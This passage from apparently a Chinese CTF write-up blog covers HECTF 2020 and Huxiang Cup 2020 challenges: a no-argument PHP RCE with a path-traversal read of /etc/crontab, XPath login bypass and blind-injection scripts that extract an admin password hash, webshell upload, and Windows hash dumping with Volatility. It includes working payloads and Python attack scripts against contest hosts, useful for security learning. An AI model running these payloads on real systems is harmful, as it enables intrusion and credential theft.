operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"great!!!!你需要看看源码"</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么<span class="token punctuation">,</span>记得加上绝对路径</code></pre><p>第一反应猜文件，爆破半天出不来<br>然后去扫目录，发现了&#x2F;etc等目录，后来比赛方给了hint，<code>/etc/crontab</code></p><p>&#96;&#96;.&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;crontab&#96;访问得</p><pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php</code></pre><p>很明显<code>/very_g00d_Y0u_got_it.php</code></p><p>访问得啥都没有，因为我们没写东西进去。<br>然后回上一步分析源码，<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>从data参数中匹配字母、数字、下划线，其实就是’\w+’，然后在匹配一个循环的’()’，将匹配的替换为NULL，判断剩下的是否只有’;’。</p><p>很明显无参数RCE，编写脚本，首先<code>print_r(getcwd());</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187" loading="lazy"><p>访问<code>/very_g00d_Y0u_got_it.php</code>得<code>/</code>，说明当前工作目录为根目录</p><img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943" loading="lazy"><p>然后<code>print_r(scandir(getcwd()));</code>扫一下目录</p><pre class="language-none"><code class="language-none">Array(    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; .dockerenv    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg    [5] &#x3D;&gt; bin    [6] &#x3D;&gt; boot    [7] &#x3D;&gt; dev    [8] &#x3D;&gt; etc    [9] &#x3D;&gt; flag    [10] &#x3D;&gt; home    [11] &#x3D;&gt; index.php    [12] &#x3D;&gt; lib    [13] &#x3D;&gt; lib64    [14] &#x3D;&gt; media    [15] &#x3D;&gt; mnt    [16] &#x3D;&gt; opt    [17] &#x3D;&gt; proc    [18] &#x3D;&gt; root    [19] &#x3D;&gt; run    [20] &#x3D;&gt; sbin    [21] &#x3D;&gt; srv    [22] &#x3D;&gt; start.sh    [23] &#x3D;&gt; sys    [24] &#x3D;&gt; tmp    [25] &#x3D;&gt; usr    [26] &#x3D;&gt; var    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php)</code></pre><img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000" loading="lazy"><p>发现异常文件<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，访问后得到了flag</p><img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419" loading="lazy"><p>最后base64一下发现<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>就是<code>fl4gggggggggggg</code></p><p>Payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span><span class="token punctuation">&#125;</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span></code></pre><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>题目链接：<a href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p><p>题目提示为注入，进入界面为登陆框，第一时间想到SQL注入</p><img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941" loading="lazy"><p>输admin登陆一下</p><img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397" loading="lazy"><p>是GET传参，sqlmap跑一下没有结果，万能密码<code>1&#39;or 1=1</code>试一下成功</p><img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642" loading="lazy"><p>怀疑是XXE，尝试了一会发现不是。<br>后来想到XPath注入(傻了，报错里有…)</p><p>XPath基础查询语句<code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></p><p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1&#x3D;1 并在 password 中输入：’ or 1&#x3D;1   就能绕过校验，成功获取所有user数据</p><p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p><p>具体不做阐述</p><hr><p><strong>尝试XPath盲注</strong></p><p>一般步骤如下:</p><p>1.判断根下节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 1</p><p>2.猜解第一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: root</p><p>3.判断root的下一级节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 2</p><p>4.猜解root的下一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: users,secret</p><p>重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.</p><p>猜解id为1的user节点下的username值,</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: admin</p><hr><p>写脚本开始跑<br>首先判断根下节点数<br>因为是GET传参，直接访问<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=登录</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706" loading="lazy"><p>这个结果应该是return 1，即根下有一个节点</p><p>如果换成<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>则会返回登录失败，即结果为return 0.</p><p>继续猜测第一级节点，用脚本跑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># !####! 换成目录即可</span></code></pre><p>结果爆出第一级为root</p><img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719" loading="lazy"><p>同理，修改第13行为<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>继续爆</p><img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235" loading="lazy"><img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627" loading="lazy"><p>最后爆出结构为&#x2F;root&#x2F;users&#x2F;user[id]</p><p>开始猜测id为1的user节点下username值，其实能猜到的admin</p><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># 爆密码就把username改成password</span></code></pre><p>爆username</p><img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104" loading="lazy"><p>果然是admin</p><p>继续爆password</p><img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953" loading="lazy"><p>结果password&#x3D;339db714647a1d66b85cd08442287841</p><p>登录一下，获得flag</p><img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hxb-Writeup</title>
      <link href="article/2020hxb-Writeup-cOMING/"/>
      <url>article/2020hxb-Writeup-cOMING/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯2020"><a href="#湖湘杯2020" class="headerlink" title="湖湘杯2020"></a>湖湘杯2020</h1><p>队伍情况</p><p>队伍名称：cOMING</p><img src="/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png" class="" loading="lazy"><p>队伍成员</p><p>gyy,Trick,hxq</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p>直接白给phpinfo <a href="http://47.111.104.169:57301/?file=phpinfo">http://47.111.104.169:57301/?file=phpinfo</a></p><img src="/article/2020hxb-Writeup-cOMING/3374b2c0d3129c0282de5d456026c0f9.png" class="" loading="lazy"><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>进网站找后台.&#x2F;admin&#x2F;<br>输入用户名密码均为admin登陆成功,html发现有&#x2F;?r&#x3D;manageinfo，进入改头像，上传一句话木马，蚁剑连上可得flag</p><img src="/article/2020hxb-Writeup-cOMING/031b1eb11298e4c672f6e91a3b07b170.png" class="" loading="lazy"><p>91d7fbeecf940113dfca79a0194d8292</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo</code></p><img src="/article/2020hxb-Writeup-cOMING/7b3aaf83f2a475ad5cab06c8856973c4.png" class="" loading="lazy"><p>内存取证 win7： <code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></p><img src="/article/2020hxb-Writeup-cOMING/4d11382c75521a279254c1d8f939e7e2.png" class="" loading="lazy"><p>MD5解出</p><p>CTF：</p><p>aad3…：空密码</p><p>0a64…:qwer1234</p><p>再结合题目：we need sha1(password)!!! sha1</p><p>解密qwer1234</p><img src="/article/2020hxb-Writeup-cOMING/ee50c0fb45bc04ff9f82fad1289d5ec8.png" class="" loading="lazy"><p>出flag</p><h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p>开文件发现<code>mingwen - 副本.txt</code>是伪加密,拖出来打包后明文攻击</p><p>爆破得密码：123%asd!O</p><img src="/article/2020hxb-Writeup-cOMING/1a7883d1491cfe53eb8d922f1251ee04.png" class="" loading="lazy"><pre class="language-none"><code class="language-none">仅需5，跳过去ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51</code></pre><p>联想栅栏加密 直接出flag</p><img src="/article/2020hxb-Writeup-cOMING/b510b2e1aae50a2ba791f6bac42dcdc2.png" class="" loading="lazy"><h3 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h3><p>东西很多，最终发现这有个.html是有用的</p><img src="/article/2020hxb-Writeup-cOMING/9302d47555b72dfa1fd14d8a8b8394e2.png" class="" loading="lazy"><p>打开，F12</p><img src="/article/2020hxb-Writeup-cOMING/f2ffd31423755c064eb38a0e7dc062f5.png" class="" loading="lazy"><p>发现base64</p><pre class="language-none"><code class="language-none">KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm&#x3D;&#x3D;KO+8oF&#x2F;vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr&#x3D;&#x3D;                            KCtfKyk&#x2F;KOOAgj7vuL88KV&#x2F;OuCjjgII+77i&#x2F;PClfzrgK                                  bygq77+j4pa977+jKinjg5bjgpwK                                      77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K                  44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp&#x3D;                    KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp&#x3D;&#x3D;flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC&#x2F;wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp&#x3D;4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn&#x3D;&#x3D;                     4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCp&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KMKsX8KsIiko77+j77mP77+j77ybKSjila&#x2F;CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV&#x2F;vvaUp44OY4pSz4pSB4pSzCu&#x3D;&#x3D;4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCo&#x3D;&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW&#x2F;jgpwvKOOEkm&#x2F;jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCp&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi&#x3D;&#x3D;KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                     KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                   KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK             KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIKZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC&#x3D;&#x3D;</code></pre><p>解密后：</p><pre class="language-none"><code class="language-none">(｡･∀･)ﾉﾞ嗨Hi~ (＠_＠;)(＠_＠;)(＠_＠;)(+_+)?(。&gt;︿&lt;)_θ(。&gt;︿&lt;)_θo(*￣▽￣*)ブ゜＜（＾－＾）＞(╯▽╰ )好香~~ヽ(✿ﾟ▽ﾟ)ノ(＠＾０＾)(^^ゞΨ(￣∀￣)Ψ*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。~\(≧▽≦)&#x2F;~o(^▽^)o(¬‿¬)(*≧︶≦))(￣▽￣* )ゞ┳━┳(╯‵□′)╯︵┻━┻┳━┳ ノ( ゜-゜ノ)ಠ_ಠಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ 